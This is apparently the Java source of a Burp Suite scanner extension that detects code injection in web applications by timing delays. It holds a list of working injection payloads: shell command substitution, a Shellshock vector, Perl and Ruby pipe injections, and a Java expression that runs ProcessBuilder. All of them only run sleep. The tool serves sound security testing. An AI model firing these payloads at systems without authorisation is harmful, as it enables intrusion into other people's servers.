package burp;
import org.apache.commons.lang3.tuple.ImmutablePair;
import org.apache.commons.lang3.tuple.Pair;
import static burp.Utilities.callbacks;
import static burp.Utilities.helpers;
import java.net.URL;
import java.util.*;

public class CodeExec extends ParamScan {
    private List<URL> _done;
    private HashMap<String, List<String>> _payloads;
    private HashMap<String, String> _extensionMappings;

    public CodeExec(String name) {
        super(name);
        this._done = new ArrayList<>();

        // Initialize payloads
        _payloads = new HashMap<>();
        _payloads.put("any", Arrays.asList(
                "\u0003 /bin/sleep $time \r",
                "'\r /bin/sleep $time \r",
                "\"\r /bin/sleep $time \r",
                "() { :;}; /bin/sleep $time",
                "() { _; } >_[$$($$())] { /bin/sleep $time; }", "$$(sleep $time)", "`sleep $time`"
        ));
        _payloads.put("php", Collections.emptyList());
        _payloads.put("perl", Arrays.asList("/bin/sleep $time|"));
        _payloads.put("ruby", Arrays.asList("|sleep $time & ping -n $time localhost & ping -c $time localhost"));
        _payloads.put("java", Arrays.asList(
                "${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"timeout\",\"$time\"})).start()).getInputStream()))).readLine()}${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{\"sleep\",\"$time\"})).start()).getInputStream()))).readLine()}"
        ));

        // Initialize extension mappings
        _extensionMappings = new HashMap<>();
        _extensionMappings.put("php5", "php");
        _extensionMappings.put("php4", "php");
        _extensionMappings.put("php3", "php");
        _extensionMappings.put("php", "php");
        _extensionMappings.put("pl", "perl");
        _extensionMappings.put("cgi", "perl");
        _extensionMappings.put("jsp", "java");
        _extensionMappings.put("do", "java");
        _extensionMappings.put("action", "java");
        _extensionMappings.put("rb", "ruby");
        _extensionMappings.put("", "php,ruby,java");
        _extensionMappings.put("unrecognised", "java");
        _extensionMappings.put("asp", "any");
        _extensionMappings.put("aspx", "any");
    }

    @Override
    List<IScanIssue> doScan(IHttpRequestResponse iHttpRequestResponse, IScannerInsertionPoint iScannerInsertionPoint) {
        return List.of();
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint) {
        Set<String> payloads = new HashSet<>();
        List<String> languages = _getLangs(basePair);

        for (String lang : languages) {
            List<String> newPayloads = _payloads.get(lang);
            if (newPayloads != null) {
                payloads.addAll(newPayloads);
            }
        }
        payloads.addAll(_payloads.get("any"));

        int delayTarget = 4000;

        for (String payload : payloads) {

            for (int confirmations = 0; ; confirmations++) {

                Pair<Long, IHttpRequestResponse> attack = _attack(basePair, insertionPoint, payload, delayTarget);
                Pair<Long, IHttpRequestResponse> dummyAttack = _attack(basePair, insertionPoint, payload, 0);

                long attackTime = attack.getKey();
                IHttpRequestResponse attackRequest = attack.getValue();
                long dummyTime = dummyAttack.getKey();
                IHttpRequestResponse dummyRequest = dummyAttack.getValue();

                if (dummyRequest.getResponse() == null) {
                    Utilities.log("Received empty response to baseline request - abandoning attack");
                    break;
                }

                if (attackTime < (delayTarget-100) || dummyTime + 1000 > attackTime) {
                    Utilities.out("Variables: " + payload + " | " + attackTime + " | " + dummyTime);
                    break;
                }

                if (confirmations == 6) {
                    Utilities.log("Code execution confirmed");
                    URL url = helpers.analyzeRequest(attack.getValue()).getUrl();
                    if (_done.contains(url)) {
                        Utilities.log("Skipping report - vulnerability already reported");
                        break;
                    }
                    _done.add(url);
                    return Arrays.asList(new CustomScanIssue(
                            attackRequest.getHttpService(),
                            url,
                            new IHttpRequestResponse[]{attackRequest},
                            "Code injection",
                            "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0ms, and a response time of <b>" + dummyTime + "</b>ms was observed. <br/>It was then instructed to sleep for " + attackTime + "ms, which resulted in a response time of <b>" + attackTime + "</b>ms. This was re-confirmed six times to reduce false-positives</p>",
                            "Firm",
                            CustomScanIssue.severity.High
                    ));
                }
            }


        }
        return Collections.emptyList();
    }

    public List<IScanIssue> doActiveScanold(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint) {
        Set<String> payloads = new HashSet<>();
        List<String> languages = _getLangs(basePair);

        for (String lang : languages) {
            List<String> newPayloads = _payloads.get(lang);
            if (newPayloads != null) {
                payloads.addAll(newPayloads);
            }
        }
        payloads.addAll(_payloads.get("any"));

        int delayTarget = 0;
        int margin = 1000;
        for (String payload : payloads) {
            if (delayTarget == 0) {
                long baseTime = _attack(basePair, insertionPoint, payload, 0).getKey();
                if (baseTime < 1000) {
                    delayTarget = 4000;
                    margin = 1000;
                } else if (baseTime < 9000) {
                    delayTarget = 9000;
                    margin = 3000;
                } else {
                    return Collections.emptyList();
                }
            }
            if (_attack(basePair, insertionPoint, payload, delayTarget).getKey() > delayTarget) {
                Utilities.log("Suspicious delay detected. Confirming it's consistent...");
                Pair<Long, IHttpRequestResponse> dummyAttack = _attack(basePair, insertionPoint, payload, 0);
                long dummyTime = dummyAttack.getKey();
                IHttpRequestResponse dummyRequest = dummyAttack.getValue();

                if (dummyRequest.getResponse() == null) {
                    Utilities.log("Received empty response to baseline request - abandoning attack");
                    break;
                }

                if (dummyTime + margin < delayTarget) {
                    Pair<Long, IHttpRequestResponse> attack = _attack(basePair, insertionPoint, payload, delayTarget);
                    long timer = attack.getKey();
                    if (timer > delayTarget) {
                        Utilities.log("Code execution confirmed");
                        URL url = helpers.analyzeRequest(attack.getValue()).getUrl();
                        if (_done.contains(url)) {
                            Utilities.log("Skipping report - vulnerability already reported");
                            break;
                        }
                        _done.add(url);
                        return Arrays.asList(new CustomScanIssue(
                                attack.getValue().getHttpService(),
                                url,
                                new IHttpRequestResponse[] {dummyRequest, attack.getValue()},
                                "Code injection",
                                "The application appears to evaluate user input as code.<p> It was instructed to sleep for 0ms, and a response time of <b>" + dummyTime + "</b>ms was observed. <br/>It was then instructed to sleep for "+delayTarget+"ms, which resulted in a response time of <b>" + timer + "</b>ms.</p>",
                                "Firm",
                                CustomScanIssue.severity.High
                        ));
                    }
                }
            }
        }

        return Collections.emptyList();
    }

    private List<String> _getLangs(IHttpRequestResponse basePair) {
        String path = helpers.analyzeRequest(basePair).getUrl().getPath();
        String ext = "";
        if (path.contains(".")) {
            ext = path.substring(path.lastIndexOf('.') + 1);
        }
        String code = _extensionMappings.getOrDefault(ext, _extensionMappings.get("unrecognised"));
        return Arrays.asList(code.split(","));
    }

    private Pair<Long, IHttpRequestResponse> _attack(IHttpRequestResponse basePair, IScannerInsertionPoint insertionPoint, String payload, long sleeptime) {
        payload = payload.replace("$time", String.valueOf(sleeptime/1000));
        long timer = System.currentTimeMillis();
        IHttpRequestResponse attack = callbacks.makeHttpRequest(basePair.getHttpService(), insertionPoint.buildRequest(payload.getBytes()));
        timer = (System.currentTimeMillis() - timer);
        Utilities.log("Response time: " + timer + "| Payload: " + payload);

        List<int[]> requestHighlights = Collections.singletonList(insertionPoint.getPayloadOffsets(payload.getBytes()));
        attack = callbacks.applyMarkers(attack, requestHighlights, null);

        return new ImmutablePair<>(timer, attack);
    }
}